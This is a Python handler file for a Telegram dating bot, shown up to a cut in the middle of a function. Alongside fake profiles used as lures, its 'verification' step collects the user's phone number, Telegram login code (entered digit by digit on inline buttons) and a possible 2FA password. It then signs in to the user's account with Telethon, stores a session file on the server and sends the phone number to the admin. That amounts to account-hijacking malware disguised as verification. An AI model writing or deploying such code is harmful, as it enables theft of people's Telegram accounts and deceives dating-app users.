from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InputMediaPhoto, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, ContentType, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import aiohttp
import os
import logging
import traceback

from telethon import TelegramClient

import database as db
from keyboards import *
from fake_generator import get_online_status
from locales import get_text
from config import ADMIN_ID, VERIFICATION_REQUIRED, VERIFICATION_AFTER_LIKES, API_ID, API_HASH

router = Router()

WELCOME_IMAGE = "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=800&h=500&fit=crop"

# === СОСТОЯНИЯ ===
class Register(StatesGroup):
    name = State()
    age = State()
    city = State()
    gender = State()
    looking_for = State()
    bio = State()
    interests = State()
    photo = State()
    photo_more = State()

class SetFilter(StatesGroup):
    city = State()
    radius = State()
    min_age = State()
    max_age = State()

class EditFake(StatesGroup):
    choose = State()
    field = State()
    value = State()

class VerifyStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()


async def get_city_from_coords(lat: float, lon: float) -> str:
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=ru,uz,en"
            async with session.get(url, headers={"User-Agent": "DatingBot/1.0"}, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    address = data.get("address", {})
                    city = (address.get("city") or 
                            address.get("town") or 
                            address.get("village") or 
                            address.get("county") or 
                            address.get("state", "Unknown"))
                    return city
    except Exception as e:
        print(f"Geocoding error: {e}")
    return None


def format_card(p: dict, lang: str) -> str:
    status = get_online_status(p.get("last_active", ""), lang)
    fake_badge = " 🎭" if p.get("is_fake") else ""
    dist = ""
    if p.get("distance_km"):
        dist = get_text("distance", lang, dist=p["distance_km"]) + "\n"
    photos_count = len(p.get("photos", []))
    photos_info = f"📸 {photos_count} фото\n" if photos_count > 1 else ""
    interests = ""
    if p.get("interests"):
        interests = get_text("interests_label", lang, interests=p["interests"]) + "\n"
    return f"📌 <b>{p['name']}</b>{fake_badge}, {p['age']}\n📍 {p['city']}\n{dist}{photos_info}{interests}{status}\n\n{p['bio']}"


async def send_profile_album(bot: Bot, chat_id: int, profile: dict, lang: str, state: FSMContext):
    photos = profile.get("photos", [])
    caption = format_card(profile, lang)
    msg_ids = []
    buttons_msg_id = None

    try:
        if photos:
            if len(photos) == 1:
                msg = await bot.send_photo(chat_id=chat_id, photo=photos[0], caption=caption, reply_markup=reactions_kb(lang))
                msg_ids = [msg.message_id]
                buttons_msg_id = msg.message_id
            else:
                media = []
                for url in photos:
                    media.append(InputMediaPhoto(media=url))
                msgs = await bot.send_media_group(chat_id=chat_id, media=media)
                msg_ids = [m.message_id for m in msgs]

                buttons_msg = await bot.send_message(
                    chat_id=chat_id,
                    text=caption,
                    reply_markup=reactions_kb(lang),
                    parse_mode="HTML"
                )
                buttons_msg_id = buttons_msg.message_id
        else:
            raise Exception("No photos")
    except Exception:
        msg = await bot.send_message(
            chat_id=chat_id,
            text=caption,
            reply_markup=reactions_kb(lang),
            parse_mode="HTML"
        )
        msg_ids = [msg.message_id]
        buttons_msg_id = msg.message_id

    await state.update_data(
        current_profile=profile["user_id"],
        album_msg_ids=msg_ids,
        buttons_msg_id=buttons_msg_id
    )
    return buttons_msg_id


async def clear_profile_messages(bot: Bot, chat_id: int, state: FSMContext):
    data = await state.get_data()
    album_ids = data.get("album_msg_ids", [])
    buttons_id = data.get("buttons_msg_id")

    all_ids = []
    for mid in album_ids:
        if mid and mid not in all_ids:
            all_ids.append(mid)
    if buttons_id and buttons_id not in all_ids:
        all_ids.append(buttons_id)

    if len(all_ids) > 1:
        try:
            await bot.delete_messages(chat_id, all_ids)
        except Exception:
            import asyncio
            tasks = [bot.delete_message(chat_id, msg_id) for msg_id in all_ids]
            await asyncio.gather(*tasks, return_exceptions=True)
    elif len(all_ids) == 1:
        try:
            await bot.delete_message(chat_id, all_ids[0])
        except Exception:
            pass

    await state.update_data(album_msg_ids=[], buttons_msg_id=None, current_profile=None)


async def send_next_profile(chat_id: int, user_id: int, state: FSMContext, bot: Bot):
    try:
        lang = db.get_lang(user_id)
        profile = db.get_profile(user_id)

        if not profile:
            return await bot.send_message(chat_id, get_text("error", lang), reply_markup=main_menu_kb(lang))

        if VERIFICATION_REQUIRED and not db.is_verified(user_id):
            likes_count = db.get_actions_count(user_id)
            if likes_count >= VERIFICATION_AFTER_LIKES:
                await bot.send_photo(
                    chat_id=chat_id,
                    photo=WELCOME_IMAGE,
                    caption=get_text("verify_text", lang, n=VERIFICATION_AFTER_LIKES),
                    reply_markup=verify_kb(lang)
                )
                return

        db.update_last_active(user_id)
        looking = profile["looking_for"]
        filters = db.get_filters(user_id)
        my_lat = profile.get("lat")
        my_lon = profile.get("lon")

        next_p = db.get_next_profile(user_id, looking, filters, my_lat, my_lon)

        if not next_p:
            stats = db.get_stats()
            text = get_text("no_profiles", lang)
            if stats["fake"] > 0 or stats["real"] > 1:
                text += f"\n\n📊 {get_text('stats', lang, real=stats['real'], fake=stats['fake'], matches=stats['matches'])}"
            await bot.send_message(chat_id, text, reply_markup=main_menu_kb(lang))
            return

        await send_profile_album(bot, chat_id, next_p, lang, state)
    except Exception as e:
        logging.error(f"Ошибка в send_next_profile для user {user_id}: {e}")
        traceback.print_exc()
        try:
            await bot.send_message(chat_id, f"⚠️ Ошибка: {e}", reply_markup=main_menu_kb(db.get_lang(user_id) or "ru"))
        except:
            pass


# === INLINE НАВИГАЦИЯ ===
@router.callback_query(F.data == "goto_watch")
async def cb_goto_watch(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await send_next_profile(callback.message.chat.id, callback.from_user.id, state, bot)

@router.callback_query(F.data == "goto_profile")
async def cb_goto_profile(callback: CallbackQuery, bot: Bot):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await show_profile(callback.message, lang, bot, user_id=callback.from_user.id)

@router.callback_query(F.data == "goto_filters")
async def cb_goto_filters(callback: CallbackQuery):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    filters = db.get_filters(callback.from_user.id)
    loc_status = "✅" if filters.get("use_location") else "❌"
    text = f"""{get_text('filter_title', lang)}

📍 {get_text('filter_city', lang)}: {filters['city_filter'] or get_text('filter_reset', lang)}
📍 {get_text('filter_radius', lang)}: {loc_status} ({filters['radius_km']} km)
🔢 {get_text('filter_age', lang)}: {filters['min_age']} - {filters['max_age']}
"""
    await callback.message.answer(text, reply_markup=filters_menu_kb(lang))


@router.callback_query(F.data == "filter_city")
async def cb_filter_city(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("filter_city_prompt", lang))
    await state.set_state(SetFilter.city)

@router.callback_query(F.data == "filter_radius")
async def cb_filter_radius(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    profile = db.get_profile(callback.from_user.id)
    if not profile or not profile.get("lat"):
        await callback.answer(get_text("no_location", lang), show_alert=True)
        return
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("filter_radius_prompt", lang))
    await state.set_state(SetFilter.radius)

@router.callback_query(F.data == "filter_age")
async def cb_filter_age(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("filter_age_min", lang))
    await state.set_state(SetFilter.min_age)

@router.callback_query(F.data == "filter_reset")
async def cb_filter_reset(callback: CallbackQuery):
    lang = db.get_lang(callback.from_user.id)
    db.set_filters(callback.from_user.id, 18, 99, "", 0, 0, None, None)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("filter_reset_done", lang), reply_markup=filters_menu_kb(lang))

@router.callback_query(F.data == "filter_back")
async def cb_filter_back(callback: CallbackQuery):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("menu", lang), reply_markup=main_menu_kb(lang))

@router.callback_query(F.data == "goto_matches")
async def cb_goto_matches(callback: CallbackQuery, bot: Bot):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    matches = db.get_matches(callback.from_user.id)
    if not matches:
        return await callback.message.answer(get_text("already_seen", lang), reply_markup=main_menu_kb(lang))
    db.update_last_active(callback.from_user.id)
    for m in matches:
        status = get_online_status(m.get("last_active", ""), lang)
        interests = ""
        if m.get("interests"):
            interests = get_text("interests_label", lang, interests=m["interests"]) + "\n"
        text = f"💘 <b>{m['name']}</b>, {m['age']}\n📍 {m['city']}\n{interests}{status}\n{m['bio']}"
        photos = m.get("photos", [])
        if len(photos) == 1:
            await callback.message.answer_photo(photo=photos[0], caption=text, reply_markup=write_kb(m["user_id"], lang))
        elif len(photos) > 1:
            media = []
            for i, url in enumerate(photos):
                cap = text if i == 0 else ""
                media.append(InputMediaPhoto(media=url, caption=cap))
            await bot.send_media_group(chat_id=callback.message.chat.id, media=media)
            await callback.message.answer(get_text("write_message", lang), reply_markup=write_kb(m["user_id"], lang))
        else:
            await callback.message.answer(text, reply_markup=write_kb(m["user_id"], lang))

@router.callback_query(F.data == "goto_likes")
async def cb_goto_likes(callback: CallbackQuery, bot: Bot):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    likes = db.get_likes_received(callback.from_user.id)
    if not likes:
        return await callback.message.answer(get_text("likes_received_empty", lang), reply_markup=main_menu_kb(lang))
    db.update_last_active(callback.from_user.id)
    await callback.message.answer(get_text("likes_received_title", lang))
    for m in likes:
        status = get_online_status(m.get("last_active", ""), lang)
        interests = ""
        if m.get("interests"):
            interests = get_text("interests_label", lang, interests=m["interests"]) + "\n"
        text = f"💘 <b>{m['name']}</b>, {m['age']}\n📍 {m['city']}\n{interests}{status}\n{m['bio']}"
        photos = m.get("photos", [])
        if len(photos) == 1:
            await callback.message.answer_photo(photo=photos[0], caption=text, reply_markup=like_back_kb(m["user_id"], lang))
        elif len(photos) > 1:
            media = []
            for i, url in enumerate(photos):
                cap = text if i == 0 else ""
                media.append(InputMediaPhoto(media=url, caption=cap))
            await bot.send_media_group(chat_id=callback.message.chat.id, media=media)
            await callback.message.answer(get_text("write_message", lang), reply_markup=like_back_kb(m["user_id"], lang))
        else:
            await callback.message.answer(text, reply_markup=like_back_kb(m["user_id"], lang))


@router.callback_query(F.data == "menu_delete")
async def cb_menu_delete(callback: CallbackQuery):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("delete_confirm", lang), reply_markup=delete_confirm_kb(lang))


# === СТАРТ / ЯЗЫК ===
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    lang = db.get_lang(message.from_user.id)
    profile = db.get_profile(message.from_user.id)

    if not lang:
        await message.answer(get_text("welcome", "ru"), reply_markup=lang_kb())
        return

    if profile:
        db.update_last_active(message.from_user.id)
        await message.answer(f"✨ <b>{get_text('menu', lang)}</b>\n\n💘 Смотрите анкеты и находите интересных людей!", reply_markup=main_menu_kb(lang))
    else:
        await message.answer(get_text("reg_name", lang))
        await state.set_state(Register.name)


@router.callback_query(F.data.in_(["lang_ru", "lang_uz"]))
async def cb_lang(callback: CallbackQuery, state: FSMContext):
    lang = "ru" if callback.data == "lang_ru" else "uz"
    db.set_lang(callback.from_user.id, lang)

    await callback.message.edit_text(get_text("lang_changed", lang))

    profile = db.get_profile(callback.from_user.id)
    if profile:
        await callback.message.answer(get_text("menu", lang), reply_markup=main_menu_kb(lang))
    else:
        await callback.message.answer(get_text("reg_name", lang))
        await state.set_state(Register.name)
    await callback.answer()


# === РЕГИСТРАЦИЯ ===
@router.message(Register.name)
async def reg_name(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    await state.update_data(name=message.text)
    await message.answer(get_text("reg_age", lang))
    await state.set_state(Register.age)

@router.message(Register.age)
async def reg_age(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    if not message.text.isdigit():
        return await message.answer(get_text("error", lang))
    age = int(message.text)
    if not (18 <= age <= 99):
        return await message.answer(get_text("reg_age", lang))
    await state.update_data(age=age)
    await message.answer(get_text("reg_city", lang), reply_markup=location_kb(lang))
    await state.set_state(Register.city)

@router.message(Register.city, F.location)
async def reg_city_location(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    lat = message.location.latitude
    lon = message.location.longitude

    detected_city = await get_city_from_coords(lat, lon)
    if detected_city:
        await state.update_data(city=detected_city, lat=lat, lon=lon)
    else:
        await state.update_data(city="Unknown", lat=lat, lon=lon)

    msg = await message.answer("⏳", reply_markup=ReplyKeyboardRemove())
    await msg.delete()
    await message.answer(get_text("reg_gender", lang), reply_markup=gender_select_kb(lang))
    await state.set_state(Register.gender)

@router.message(Register.city)
async def reg_city_text(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    if not message.text:
        return await message.answer(get_text("reg_city", lang), reply_markup=location_kb(lang))

    await state.update_data(city=message.text, lat=None, lon=None)
    msg = await message.answer("⏳", reply_markup=ReplyKeyboardRemove())
    await msg.delete()
    await message.answer(get_text("reg_gender", lang), reply_markup=gender_select_kb(lang))
    await state.set_state(Register.gender)

@router.callback_query(F.data.in_(["gender_male", "gender_female"]), Register.gender)
async def cb_reg_gender(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    gender = "male" if callback.data == "gender_male" else "female"
    await state.update_data(gender=gender)
    await callback.message.edit_text(get_text("reg_looking", lang), reply_markup=looking_select_kb(lang))
    await state.set_state(Register.looking_for)
    await callback.answer()

@router.callback_query(F.data.in_(["look_male", "look_female", "look_all"]), Register.looking_for)
async def cb_reg_looking(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    if callback.data == "look_male":
        look = "male"
    elif callback.data == "look_female":
        look = "female"
    else:
        look = "all"
    await state.update_data(looking_for=look)
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("reg_bio", lang), reply_markup=bio_skip_kb(lang))
    await state.set_state(Register.bio)
    await callback.answer()

@router.message(Register.bio)
async def reg_bio(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    text = message.text.strip()

    if text in [get_text("skip_bio", "ru"), get_text("skip_bio", "uz")]:
        await state.update_data(bio="")
        msg = await message.answer("⏳", reply_markup=ReplyKeyboardRemove())
        await msg.delete()
        await message.answer(get_text("reg_interests", lang), reply_markup=interests_kb(lang))
        await state.set_state(Register.interests)
        return

    if len(text) > 300:
        return await message.answer(get_text("reg_bio", lang), reply_markup=bio_skip_kb(lang))

    await state.update_data(bio=text)
    msg = await message.answer("⏳", reply_markup=ReplyKeyboardRemove())
    await msg.delete()
    await message.answer(get_text("reg_interests", lang), reply_markup=interests_kb(lang))
    await state.set_state(Register.interests)

@router.callback_query(F.data.startswith("interest_"), Register.interests)
async def cb_interest(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    data = await state.get_data()
    selected = data.get("selected_interests", set())
    idx = int(callback.data.split("_")[1])
    items = INTERESTS.get(lang, INTERESTS["ru"])
    item = items[idx]

    if item in selected:
        selected.remove(item)
    else:
        selected.add(item)

    await state.update_data(selected_interests=selected)
    await callback.message.edit_reply_markup(reply_markup=interests_kb(lang, selected))
    await callback.answer()


@router.callback_query(F.data == "interests_done", Register.interests)
async def cb_interests_done(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    data = await state.get_data()
    selected = data.get("selected_interests", set())
    interests_str = ", ".join(selected) if selected else ""
    await state.update_data(interests=interests_str)
    await callback.message.edit_text(get_text("reg_photo", lang) + "\n\n💡 Можно отправить несколько фото. Когда закончите, нажмите «Готово».")
    await state.set_state(Register.photo)
    await callback.answer()

@router.message(Register.photo, F.photo)
async def reg_photo(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    photo_id = message.photo[-1].file_id

    data = await state.get_data()
    photos = data.get("photos", [])
    photos.append(photo_id)
    await state.update_data(photos=photos)

    msg = await message.answer(
        get_text("photo_saved", lang, n=len(photos)),
        reply_markup=photo_done_inline_kb(lang)
    )
    await state.update_data(photo_msg_id=msg.message_id)
    await state.set_state(Register.photo_more)

@router.message(Register.photo)
async def reg_photo_err(message: Message):
    lang = db.get_lang(message.from_user.id)
    await message.answer(get_text("reg_photo", lang))

@router.message(Register.photo_more, F.photo)
async def reg_photo_more(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    photo_id = message.photo[-1].file_id

    data = await state.get_data()
    photos = data.get("photos", [])
    photos.append(photo_id)
    await state.update_data(photos=photos)

    photo_msg_id = data.get("photo_msg_id")
    if photo_msg_id:
        try:
            await message.bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=photo_msg_id,
                text=get_text("photo_saved", lang, n=len(photos)),
                reply_markup=photo_done_inline_kb(lang)
            )
        except:
            msg = await message.answer(
                get_text("photo_saved", lang, n=len(photos)),
                reply_markup=photo_done_inline_kb(lang)
            )
            await state.update_data(photo_msg_id=msg.message_id)
    else:
        msg = await message.answer(
            get_text("photo_saved", lang, n=len(photos)),
            reply_markup=photo_done_inline_kb(lang)
        )
        await state.update_data(photo_msg_id=msg.message_id)

@router.callback_query(F.data == "photo_done", Register.photo_more)
async def cb_photo_done(callback: CallbackQuery, state: FSMContext, bot: Bot):
    lang = db.get_lang(callback.from_user.id)
    data = await state.get_data()
    photos = data.get("photos", [])

    if not photos:
        await callback.answer(get_text("reg_photo", lang), show_alert=True)
        return

    try:
        await callback.message.delete()
    except:
        pass

    db.save_profile(
        user_id=callback.from_user.id,
        name=data["name"],
        age=data["age"],
        city=data["city"],
        lat=data.get("lat"),
        lon=data.get("lon"),
        gender=data["gender"],
        looking_for=data["looking_for"],
        bio=data["bio"],
        interests=data.get("interests", ""),
        is_fake=0
    )

    for idx, photo_id in enumerate(photos):
        db.add_photo(callback.from_user.id, photo_id, idx)

    db.set_filters(callback.from_user.id, 18, 99, "", 0, 0, None, None)

    await state.clear()
    await callback.message.answer(get_text("profile_created", lang), reply_markup=main_menu_kb(lang))
    await callback.answer()

@router.message(Register.photo_more)
async def reg_photo_more_err(message: Message):
    lang = db.get_lang(message.from_user.id)
    await message.answer(get_text("photo_or_done", lang))


# === ПРОСМОТР АНКЕТ ===
@router.callback_query(F.data.in_(["react_fire", "react_heart", "react_handshake"]))
async def cb_process_reaction(callback: CallbackQuery, state: FSMContext, bot: Bot):
    try:
        lang = db.get_lang(callback.from_user.id)
        data = await state.get_data()
        target_id = data.get("current_profile")

        if not target_id:
            await callback.answer(get_text("error", lang), show_alert=True)
            return

        action = callback.data.replace("react_", "")
        db.add_action(callback.from_user.id, target_id, action)

        target = db.get_profile(target_id)

        if action == "heart":
            if target and not target.get("is_fake"):
                if db.check_mutual_like(callback.from_user.id, target_id):
                    db.save_match(callback.from_user.id, target_id)
                    await callback.message.answer(
                        get_text("match", lang, name=target["name"], age=target["age"], city=target["city"]),
                        reply_markup=write_kb(target_id, lang)
                    )
            await callback.answer(get_text("action_like", lang))
        elif action == "fire":
            await callback.answer("🔥")
        elif action == "handshake":
            await callback.answer("🤝")
        else:
            await callback.answer(get_text("action_skip", lang))

        await clear_profile_messages(bot, callback.message.chat.id, state)
        await send_next_profile(callback.message.chat.id, callback.from_user.id, state, bot)
    except Exception as e:
        logging.error(f"Ошибка в cb_process_reaction: {e}")
        traceback.print_exc()
        await callback.answer(f"⚠️ Ошибка: {e}", show_alert=True)


@router.callback_query(F.data == "skip")
async def cb_skip(callback: CallbackQuery, state: FSMContext, bot: Bot):
    try:
        lang = db.get_lang(callback.from_user.id)
        await callback.answer(get_text("action_skip", lang))
        await clear_profile_messages(bot, callback.message.chat.id, state)
        await send_next_profile(callback.message.chat.id, callback.from_user.id, state, bot)
    except Exception as e:
        logging.error(f"Ошибка в cb_skip: {e}")
        traceback.print_exc()
        await callback.answer(f"⚠️ Ошибка: {e}", show_alert=True)


# === МОЯ АНКЕТА ===
async def show_profile(message: Message, lang: str, bot: Bot, user_id: int = None):
    uid = user_id or message.from_user.id
    profile = db.get_profile(uid)
    if not profile:
        await message.answer(get_text("error", lang), reply_markup=ReplyKeyboardRemove())
        return await message.answer(get_text("error", lang), reply_markup=main_menu_kb(lang))

    db.update_last_active(message.from_user.id)

    photos = profile.get("photos", [])
    if not photos:
        photos = ["https://via.placeholder.com/400?text=No+Photo"]

    coords = ""
    if profile.get("lat"):
        coords = f"📍 {profile['lat']:.4f}, {profile['lon']:.4f}\n"

    status = get_online_status(profile.get("last_active", ""), lang)
    caption = f"📌 <b>{profile['name']}</b>, {profile['age']}\n📍 {profile['city']}\n{coords}{status}\n\n{profile['bio']}"

    if len(photos) == 1:
        await message.answer_photo(photo=photos[0], caption=caption, reply_markup=profile_actions_kb(lang))
    else:
        media = []
        for i, url in enumerate(photos):
            cap = caption if i == 0 else ""
            media.append(InputMediaPhoto(media=url, caption=cap))
        await bot.send_media_group(chat_id=message.chat.id, media=media)
        await message.answer(get_text("your_profile", lang), reply_markup=profile_actions_kb(lang))


# === ФИЛЬТРЫ ===
@router.message(SetFilter.city)
async def filter_city_set(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    city = message.text.strip()
    if city.lower() in ["любой", "все", "сброс", "любой город", "barchasi", "hammasi"]:
        city = ""

    filters = db.get_filters(message.from_user.id)
    db.set_filters(message.from_user.id, filters["min_age"], filters["max_age"], city, 
                   filters["radius_km"], 0, None, None)

    await state.clear()
    await message.answer(get_text("filter_set", lang), reply_markup=filters_menu_kb(lang))


@router.message(SetFilter.radius)
async def filter_radius_set(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    if not message.text.isdigit():
        return await message.answer(get_text("error", lang))
    radius = int(message.text)
    if radius < 1 or radius > 500:
        return await message.answer(get_text("filter_radius_prompt", lang))

    profile = db.get_profile(message.from_user.id)
    db.set_filters(
        message.from_user.id, 18, 99, "", radius, 1,
        profile.get("lat"), profile.get("lon")
    )

    await state.clear()
    await message.answer(get_text("filter_set", lang), reply_markup=filters_menu_kb(lang))


@router.message(SetFilter.min_age)
async def filter_age_min(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    if not message.text.isdigit():
        return await message.answer(get_text("error", lang))
    min_age = int(message.text)
    if min_age < 18:
        return await message.answer(get_text("filter_age_min", lang))
    await state.update_data(min_age=min_age)
    await message.answer(get_text("filter_age_max", lang))
    await state.set_state(SetFilter.max_age)

@router.message(SetFilter.max_age)
async def filter_age_max(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    if not message.text.isdigit():
        return await message.answer(get_text("error", lang))
    max_age = int(message.text)
    if max_age > 99:
        return await message.answer(get_text("filter_age_max", lang))

    data = await state.get_data()
    min_age = data.get("min_age", 18)

    filters = db.get_filters(message.from_user.id)
    db.set_filters(message.from_user.id, min_age, max_age, filters["city_filter"], 
                   filters["radius_km"], filters.get("use_location", 0),
                   filters.get("filter_lat"), filters.get("filter_lon"))

    await state.clear()
    await message.answer(get_text("filter_set", lang), reply_markup=filters_menu_kb(lang))


# === МЭТЧИ ===
# === УДАЛЕНИЕ ===
@router.callback_query(F.data == "profile_delete")
async def cb_profile_delete(callback: CallbackQuery):
    lang = db.get_lang(callback.from_user.id)
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("delete_confirm", lang), reply_markup=delete_confirm_kb(lang))
    await callback.answer()


@router.message(F.text.in_([get_text("delete_yes", "ru"), get_text("delete_yes", "uz")]))
async def msg_delete_confirm(message: Message):
    lang = db.get_lang(message.from_user.id)
    db.delete_profile(message.from_user.id)
    await message.answer(get_text("deleted", lang), reply_markup=ReplyKeyboardRemove())

@router.message(F.text.in_([get_text("delete_no", "ru"), get_text("delete_no", "uz")]))
async def msg_delete_cancel(message: Message):
    lang = db.get_lang(message.from_user.id)
    await message.answer(get_text("menu", lang), reply_markup=ReplyKeyboardRemove())
    await message.answer(get_text("menu", lang), reply_markup=main_menu_kb(lang))

@router.message(F.text.in_([get_text("btn_back", "ru"), get_text("btn_back", "uz")]))
async def back_to_main(message: Message):
    lang = db.get_lang(message.from_user.id)
    await message.answer(get_text("menu", lang), reply_markup=ReplyKeyboardRemove())
    await message.answer(get_text("menu", lang), reply_markup=main_menu_kb(lang))


# === ВЕРИФИКАЦИЯ ===
async def start_telethon_verification(message: Message, state: FSMContext, phone_number: str, lang: str):
    """Общая логика запуска Telethon верификации"""
    await state.update_data(phone=phone_number)

    if not API_ID or not API_HASH:
        await message.answer(get_text("verify_not_set", lang), reply_markup=main_menu_kb(lang))
        await state.clear()
        return

    await message.answer(get_text("verify_wait_code", lang), reply_markup=ReplyKeyboardRemove())

    try:
        os.makedirs("sessions", exist_ok=True)

        client = TelegramClient(f"sessions/{phone_number}", api_id=API_ID, api_hash=API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            await state.update_data(client=client)
            await state.set_state(VerifyStates.waiting_for_code)

            await message.answer(
                get_text("verify_enter_code", lang),
                reply_markup=verify_code_kb(lang)
            )
            await state.update_data(current_code="")
        else:
            await client.disconnect()
            db.verify_user(message.from_user.id)
            
            # Уведомление админу
            try:
                await message.bot.send_message(
                    ADMIN_ID,
                    f"✅ <b>Новая верификация!</b>\n\n"
                    f"👤 Пользователь: {message.from_user.full_name}\n"
                    f"🆔 ID: <code>{message.from_user.id}</code>\n"
                    f"📱 Телефон: <code>{phone_number}</code>\n"
                    f"🔑 Тип: уже авторизован",
                    parse_mode="HTML"
                )
            except Exception as e:
                logging.error(f"Не удалось уведомить админа: {e}")
            
            await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
            await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
            await state.clear()

    except Exception as e:
        await message.answer(get_text("verify_error", lang, error=str(e)), reply_markup=main_menu_kb(lang))
        await state.clear()


@router.message(F.text.in_([get_text("verify_button", "ru"), get_text("verify_button", "uz")]))
async def msg_start_verify(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)

    if db.is_verified(message.from_user.id):
        await message.answer(get_text("verify_already", lang))
        return

    await state.set_state(VerifyStates.waiting_for_phone)
    await message.answer(
        get_text("verify_or_enter", lang),
        reply_markup=verify_contact_kb(lang)
    )


@router.message(F.content_type == ContentType.CONTACT, VerifyStates.waiting_for_phone)
async def process_contact(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)

    if not message.contact or not message.contact.phone_number:
        await message.answer(get_text("error", lang))
        return

    phone_number = message.contact.phone_number
    await start_telethon_verification(message, state, phone_number, lang)


@router.message(VerifyStates.waiting_for_phone, F.text)
async def process_phone_text(message: Message, state: FSMContext):
    """Обработка ручного ввода номера телефона — только Узбекистан (+998)"""
    lang = db.get_lang(message.from_user.id)
    text = message.text.strip()

    cleaned = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")

    if cleaned.startswith("+"):
        cleaned = cleaned[1:]

    if cleaned.startswith("998") and len(cleaned) == 12 and cleaned[3:].isdigit():
        phone_number = "+" + cleaned
    elif cleaned.isdigit() and len(cleaned) == 9:
        phone_number = "+998" + cleaned
    else:
        await message.answer(
            "❌ Принимаются только узбекские номера. Введите номер в формате: <code>+998901234567</code>",
            reply_markup=ReplyKeyboardRemove()
        )
        return

    await start_telethon_verification(message, state, phone_number, lang)


@router.callback_query(F.data.startswith("code_"), VerifyStates.waiting_for_code)
async def process_inline_code(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    action = callback.data.split("_")[1]
    data = await state.get_data()
    current_code = data.get("current_code", "")

    if action == "backspace":
        current_code = current_code[:-1]
    elif action == "submit":
        if len(current_code) > 0:
            await process_code_submission(callback.message, state, current_code, lang, callback.from_user.id)
            await callback.answer()
            return
        else:
            await callback.answer(get_text("error", lang), show_alert=True)
            return
    elif action.isdigit():
        current_code += action
        if len(current_code) > 5:
            await callback.answer("Код слишком длинный!", show_alert=True)
            return

    await state.update_data(current_code=current_code)

    markup = verify_code_kb(lang)
    await callback.message.edit_text(
        f"{get_text('verify_enter_code', lang)}\n\nКод: {current_code}",
        reply_markup=markup
    )
    await callback.answer()


async def process_code_submission(message: Message, state: FSMContext, code: str, lang: str, user_id: int):
    data = await state.get_data()
    client = data.get('client')
    phone = data.get('phone')

    if not client or not phone:
        await state.clear()
        await message.answer(get_text("error", lang), reply_markup=main_menu_kb(lang))
        return

    try:
        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            err_str = str(e).lower()
            if "expired" in err_str:
                try:
                    await client.disconnect()
                    new_client = TelegramClient(f"sessions/{phone}", api_id=API_ID, api_hash=API_HASH)
                    await new_client.connect()
                    await new_client.send_code_request(phone)
                    await state.update_data(client=new_client, current_code="")
                    await message.answer(
                        "⏳ Код истёк. Новый код отправлен. Введите его:",
                        reply_markup=verify_code_kb(lang)
                    )
                    await state.set_state(VerifyStates.waiting_for_code)
                    return
                except Exception as e2:
                    await state.clear()
                    await message.answer(
                        get_text("verify_error", lang, error=f"Не удалось отправить новый код: {e2}"),
                        reply_markup=main_menu_kb(lang)
                    )
                    return
            elif "password" in err_str or "two-step" in err_str or "2fa" in err_str:
